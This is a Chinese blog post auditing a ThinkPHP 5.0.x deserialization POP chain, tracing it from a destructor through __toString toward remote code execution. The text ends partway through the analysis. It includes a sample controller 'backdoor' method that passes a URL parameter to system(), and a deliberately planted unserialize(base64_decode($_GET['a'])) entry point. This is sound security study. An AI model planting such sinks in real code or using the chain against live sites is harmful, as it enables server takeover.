<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ThinkPHP-5.0.x POP链 | Ho1L0w-By's Blog</title><meta name="keywords" content="代码审计"><meta name="author" content="Ho1L0w-By"><meta name="copyright" content="Ho1L0w-By"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ThinkPHP 5.0.X代码审计：前言：本次记录主要是对ThinkPHP 框架的 5.0.x版本进行代码审计，主要涉及的软件有：  PHPSTORM Seay源代码审计系统 Phpstudy_pro PHP版本使用7.3.4  关于PHPSTORM的Xdebug的搭建，我主要参考了暗月的教程 （说实话phpstudy_pro的配置文件真的太麻烦了） ThinkPHP 5.0.24 链接 Sea">
<meta property="og:type" content="article">
<meta property="og:title" content="ThinkPHP-5.0.x POP链">
<meta property="og:url" content="https://ho1l0w-by.github.io/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Ho1L0w-By&#39;s Blog">
<meta property="og:description" content="ThinkPHP 5.0.X代码审计：前言：本次记录主要是对ThinkPHP 框架的 5.0.x版本进行代码审计，主要涉及的软件有：  PHPSTORM Seay源代码审计系统 Phpstudy_pro PHP版本使用7.3.4  关于PHPSTORM的Xdebug的搭建，我主要参考了暗月的教程 （说实话phpstudy_pro的配置文件真的太麻烦了） ThinkPHP 5.0.24 链接 Sea">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ho1l0w-by.github.io/img/background.jpg">
<meta property="article:published_time" content="2022-08-24T11:03:50.000Z">
<meta property="article:modified_time" content="2022-08-25T04:04:22.374Z">
<meta property="article:author" content="Ho1L0w-By">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ho1l0w-by.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/Myhead.jpg"><link rel="canonical" href="https://ho1l0w-by.github.io/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ThinkPHP-5.0.x POP链',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-25 12:04:22'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Myhead.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ho1L0w-By's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ThinkPHP-5.0.x POP链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-24T11:03:50.000Z" title="发表于 2022-08-24 19:03:50">2022-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-25T04:04:22.374Z" title="更新于 2022-08-25 12:04:22">2022-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ThinkPHP-5.0.x POP链"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ThinkPHP-5-0-X代码审计："><a href="#ThinkPHP-5-0-X代码审计：" class="headerlink" title="ThinkPHP 5.0.X代码审计："></a>ThinkPHP 5.0.X代码审计：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>本次记录主要是对ThinkPHP 框架的 5.0.x版本进行代码审计，主要涉及的软件有：</p>
<blockquote>
<p>PHPSTORM</p>
<p>Seay源代码审计系统</p>
<p>Phpstudy_pro</p>
<p>PHP版本使用7.3.4</p>
</blockquote>
<p>关于PHPSTORM的Xdebug的搭建，我主要参考了<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ri4y1m7AZ/?spm_id_from=333.788&vd_source=12a4f922a214b16d9f4d1f3565210b8b">暗月的教程</a></p>
<p>（说实话phpstudy_pro的配置文件真的太麻烦了）</p>
<p><a target="_blank" rel="noopener" href="http://www.thinkphp.cn/donate/download/id/1279.html">ThinkPHP 5.0.24 链接</a></p>
<h2 id="Seay自动审计："><a href="#Seay自动审计：" class="headerlink" title="Seay自动审计："></a>Seay自动审计：</h2><p>首先还是常规操作，使用Seay源代码审计系统来进行自动审计：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220809164053433.png" alt="image-20220809164053433"></p>
<p>这边出了一堆。不过不是每个都有用的。</p>
<p>主要还是要审计POP链，然后RCE。</p>
<h2 id="目录结构："><a href="#目录结构：" class="headerlink" title="目录结构："></a>目录结构：</h2><p>首先是对ThinkPHP 5.0目录结构进行查看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│  ├─common             公共模块目录（可以更改）</span><br><span class="line">│  ├─module_name        模块目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─config.php         公共配置文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─database.php       数据库配置文件</span><br><span class="line">│</span><br><span class="line">├─public                WEB目录（对外访问目录）</span><br><span class="line">│  ├─index.php          入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言文件目录</span><br><span class="line">│  ├─library            框架类库目录</span><br><span class="line">│  │  ├─think           Think类库包目录</span><br><span class="line">│  │  └─traits          系统Trait目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     框架惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件</span><br><span class="line">│  ├─phpunit.xml        phpunit配置文件</span><br><span class="line">│  └─start.php          框架入口文件</span><br><span class="line">│</span><br><span class="line">├─extend                扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor                第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure>

<p>这部分可以比较明确的看见每个部分代码的作用是什么，方便到时候思考，或者是跟链子。</p>
<h2 id="构建利用点："><a href="#构建利用点：" class="headerlink" title="构建利用点："></a>构建利用点：</h2><p><strong>关于控制器文件(Controller):</strong></p>
<p>ThinkPHP的控制器是一个类，接收用户的输入并调用模型和视图去完成用户的需求，控制器层由核心控制器和业务控制器组成，核心控制器由系统内部的App类完成，负责应用（包括模块、控制器和操作）的调度控制，包括HTTP请求拦截和转发、加载配置等。业务控制器则由用户定义的控制器类完成。多层业务控制器的实现原理和模型的分层类似，例如业务控制器和事件控制器。</p>
<p><strong>控制器写法：</strong></p>
<p>控制器文件通常放在<code>application/module/controller</code>下面，类名和文件名保持大小写一致，并采用驼峰命名（首字母大写）。</p>
<p>一个典型的控制器类定义如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>控制器类文件的实际位置是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">application\index\controller\Index.php</span><br></pre></td></tr></table></figure>

<p>一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想进入后门，需要访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/index.php/Index/backdoor/?command=ls</span><br></pre></td></tr></table></figure>

<p>像上面这样就可以实现命令执行。</p>
<p>这个框架是需要<strong>二次开发</strong>，并且实现反序列化才能够进行利用，<strong>所以需要手写一个利用点。</strong>就写在controller里。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome thinkphp 5.0.24&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])); <span class="comment">//下面部分是自带的。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h2><p>对于PHP反序列化来说，一般来说，比较常见的起点是：</p>
<blockquote>
<p>_wakeup()  反序列化后，自动被调用</p>
<p>_destruct() 对象被销毁前，被调用</p>
<p>_toString()  对象被当作字符串输出前，被调用</p>
</blockquote>
<p>比较常见的中间跳板是：</p>
<blockquote>
<p>__toString 当一个对象被当做字符串使用，自动被调用</p>
<p>__get 读取不可访问或不存在属性时被调用</p>
<p>__set 当给不可访问或不存在属性赋值时被调用</p>
<p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p>
<p>形如 $this-&gt;$func();</p>
</blockquote>
<p>根据以上两个经验，首先在Seay中进行全局查找。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810164113231.png" alt="image-20220810164113231"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810164130266.png" alt="image-20220810164130266"></p>
<p>那么可能存在的POP链大概率就在这部分。</p>
<h2 id="尝试审计："><a href="#尝试审计：" class="headerlink" title="尝试审计："></a>尝试审计：</h2><p>尝试审计第一个<code>__wakeup()</code></p>
<p>实际上来说<code>__wakeup()</code>因为是在进行了反序列化之后才进行的，所以大部分时候是对反序列化内容的限制，很少作为入口，大部分时候可以直接看<code>__destruct()</code></p>
<p>但是这里还是看一下</p>
<p>从Seay里可以看见，这部分的反序列化函数在：<br><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810165159038.png" alt="image-20220810165159038"></p>
<p>首先看一下<code>unserialize()</code>中的值是否可控。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810171741240.png" alt="image-20220810171741240"></p>
<p>向上看一下<code>$value</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810173114362.png" alt="image-20220810173114362"></p>
<p>这里可以看见value的值被设置为了null。</p>
<p>后面陆续向下看，可以发现的是$value值在这部分被用来存储时间戳<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810200145426.png" alt="image-20220810200145426"></p>
<p>然后在接下来的<code>writeTransform()</code>函数部分进行使用者需要的数据类型的更改。</p>
<p>然后在<code>readTransform()</code>部分进行数据类型的变回去（进行了json格式加码，就进行解码，进行了序列化的就反序列化）</p>
<p>因此很容易发现<code>$value</code>的值是我们不能操控的，所以这里无法利用。</p>
<h2 id="POP链："><a href="#POP链：" class="headerlink" title="POP链："></a>POP链：</h2><p>有了以上的经验，接下来我们对<code>__destruct()</code>函数进行审计。</p>
<p>路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/process/pipes/Windows.php</span><br></pre></td></tr></table></figure>

<p>这里首先看一下<code>__destruct()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201437296.png" alt="image-20220810201437296"></p>
<p>可以看见这边调用了两个函数，跟进一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201548871.png" alt="image-20220810201548871"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810201608641.png" alt="image-20220810201608641"> </p>
<p>首先分析一下<code>close()</code>成员方法。</p>
<p>可以看到这里首先是调用了父类中的<code>close()</code>方法，这里跟进一下，可以找到父类<code>Pipes</code>中的<code>close()</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810202655543.png" alt="image-20220810202655543"></p>
<p>这里的作用就是将<code>pipes</code>数组中存在的文件一一关闭，最后再将<code>pipes</code>数组清空。</p>
<p>子类中的方法同理，可知<code>close()</code>用于关闭文件，虽然可以控制传参，但是不能进一步利用。</p>
<p>分析<code>removeFiles()</code>成员方法。</p>
<p>可以看见这里有一个敏感函数，<code>file_exists()</code>。当执行该函数的时候，会将参数作为字符串来判断，如果输入的是参数是一个对象，可以触发<code>__toString()</code>魔术方法</p>
<p>看一下<code>$filename</code>能不能控制。</p>
<p>这里看一下<code>$this-&gt;files</code>的用法，写入值在<code>__construct()</code>，不影响，因为反序列化不会调用<code>__construct()</code>函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220810223824350.png" alt="image-20220810223824350"></p>
<p>可以在<code>__construct()</code>看见files数组中，进行定义的过程。</p>
<p>这里使用到了<code>tempnam()</code>函数，可以再指定的目录中创建一个具有唯一文件名的临时文件。成功返回新的文件名，失败返回false。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811155604058.png" alt="image-20220811155604058"></p>
<p>另一个函数返回当前操作系统的临时文件目录。</p>
<p>这部分可以看见数组<code>$file</code>的定义，发现是可以控制的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811203810750.png" alt="image-20220811203810750"></p>
<p>跟进到<code>__toString()</code>，在Seay代码审计系统中进行全局搜索：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220811204906271.png" alt="image-20220811204906271"></p>
<p>这里经过尝试之后，可以直接跟进到<code>Model.php</code>中的<code>__toString()</code>参数。**(注意Model是一个抽象类，要进行了继承了之后才能实例化成对象，所以要找一个子类，这里可以选择Pivot)**</p>
<p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220812142053975.png" alt="image-20220812142053975"></p>
<p>跟进到<code>toJson()</code>方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812142139952.png" alt="image-20220812142139952"></p>
<p>这里使用了<code>json_encode()</code>函数，函数返回一个字符串，包含了value值json格式的表示。编码会受到options参数的印象。</p>
<p>跟进到<code>toArray()</code>方法。（太长了，不放截图）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">reset</span>(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="variable 